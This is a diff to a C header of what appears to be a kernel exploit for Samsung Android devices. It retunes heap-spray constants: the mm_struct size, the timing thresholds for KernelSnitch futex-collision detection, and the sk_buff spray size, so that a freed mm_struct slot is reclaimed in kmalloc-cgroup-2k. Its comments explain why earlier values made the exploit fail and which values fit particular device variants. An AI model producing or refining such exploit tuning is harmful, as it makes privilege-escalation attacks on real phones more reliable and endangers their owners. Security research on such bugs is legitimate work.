@@ -59,9 +59,32 @@
 #define __ASHMEMIOC 0x77
 #define ASHMEM_SET_NAME _IOW(__ASHMEMIOC, 1, char[ASHMEM_NAME_LEN])
 
+/*
+ * MM_STRUCT_SZ — sizeof(struct mm_struct) on the target kernel.
+ *
+ * Samsung GKI kernels on v3.3.0+ pad mm_struct with additional RKP/KDP
+ * fields, growing it from the upstream 0x500 to 0x540. Using the wrong
+ * value corrupts every spray-count calculation in pipe.c (pre/post/spray
+ * object counts are computed as ORDER3_SIZE / MM_STRUCT_SZ), causing the
+ * freed slot to never be adjacent to the sk_buff reclaim window.
+ *
+ * If your target uses a different mm_struct size, override at build time:
+ *   -DMM_STRUCT_SZ=0x500   (upstream / AOSP GKI, no Samsung RKP padding)
+ *   -DMM_STRUCT_SZ=0x540   (Samsung GKI v3.3.0+, default below)
+ *   -DMM_STRUCT_SZ=0x560   (some S928/Exynos variants)
+ */
 #ifndef MM_STRUCT_SZ
-#define MM_STRUCT_SZ 0x500
+#define MM_STRUCT_SZ 0x540
 #endif
+/* Sanity checks — MM_STRUCT_SZ must be 8-byte aligned and in a
+ * plausible range for any Samsung kernel we support. */
+#if (MM_STRUCT_SZ & 7) != 0
+#error "MM_STRUCT_SZ must be a multiple of 8"
+#endif
+#if MM_STRUCT_SZ < 0x400 || MM_STRUCT_SZ > 0x800
+#error "MM_STRUCT_SZ is outside the expected Samsung kernel range (0x400-0x800)"
+#endif
+
 #ifndef MM_ORDER
 #define MM_ORDER 3
 #endif
@@ -77,13 +100,63 @@
 #define KSNITCH_COLLISIONS 4
 #endif
 
+/*
+ * KernelSnitch collision-finding tuning.
+ *
+ * KERNELSNITCH_THRESHOLD_MULT: multiplier applied to the baseline futex
+ * latency to detect a loaded hash bucket. The previous value of 10 misses
+ * real collisions on Samsung devices where RKP increases baseline futex
+ * latency, pushing the threshold too high. Lowered to 6.
+ *
+ * KERNELSNITCH_COLLISION_CONFIRMATIONS: number of re-measurements required
+ * before a candidate collision is accepted. Raised from 3 to 5 to keep
+ * the false-positive rate low despite the lower threshold multiplier.
+ *
+ * KERNELSNITCH_BASELINE_SAMPLES / KERNELSNITCH_BASELINE_QUANTILE: use 4
+ * samples and take the second-lowest (index 1) as the baseline. Taking
+ * the absolute minimum (index 0) is fragile; a single anomalously-fast
+ * measurement drives the threshold too low on loaded devices.
+ */
+#ifndef KERNELSNITCH_THRESHOLD_MULT
+#define KERNELSNITCH_THRESHOLD_MULT 6
+#endif
+#ifndef KERNELSNITCH_COLLISION_CONFIRMATIONS
+#define KERNELSNITCH_COLLISION_CONFIRMATIONS 5
+#endif
+#ifndef KERNELSNITCH_BASELINE_SAMPLES
+#define KERNELSNITCH_BASELINE_SAMPLES 4
+#endif
+#ifndef KERNELSNITCH_BASELINE_QUANTILE
+#define KERNELSNITCH_BASELINE_QUANTILE 1
+#endif
+
 #define ORDER3_SIZE (PAGE_SIZE << MM_ORDER)
 #define PIPE_CANDIDATE_PAGES 8
+
+/*
+ * SKB_SEND_SIZE — size of the sendmsg payload used to spray sk_buff data
+ * objects into kmalloc-cgroup for mm_struct slot reclaim.
+ *
+ * The previous value was ORDER3_SIZE*2 = 0x8000 (32 768 bytes). An skb
+ * data allocation of that size is served from vmalloc, NOT kmalloc-cgroup,
+ * so it can never land in an mm_struct slab slot — explaining why
+ * cleanup_kernelsnitch() always returned -1.
+ *
+ * Samsung mm_struct lives in kmalloc-cgroup-2k (objects up to 2048 bytes,
+ * i.e. kmalloc index 11). To reclaim a freed mm_struct slot the skb data
+ * must also go to kmalloc-cgroup-2k. The skb data size for a sendmsg of
+ * N bytes is roughly N + skb_shared_info overhead; keeping the sendmsg
+ * payload under 1984 bytes keeps the total allocation below 2048 bytes
+ * and squarely in the cgroup-2k bucket.
+ *
+ * SKB_RECLAIM_SENDS is raised from 4 to 8 to compensate for the smaller
+ * per-send fill and maintain adequate reclaim pressure.
+ */
 #ifndef SKB_SEND_SIZE
-#define SKB_SEND_SIZE (ORDER3_SIZE * 2)
+#define SKB_SEND_SIZE 0x7C0
 #endif
 #ifndef SKB_RECLAIM_SENDS
-#define SKB_RECLAIM_SENDS 4
+#define SKB_RECLAIM_SENDS 8
 #endif
 #ifndef APP_SLIDE_RECLAIM_SENDS
 #define APP_SLIDE_RECLAIM_SENDS 16
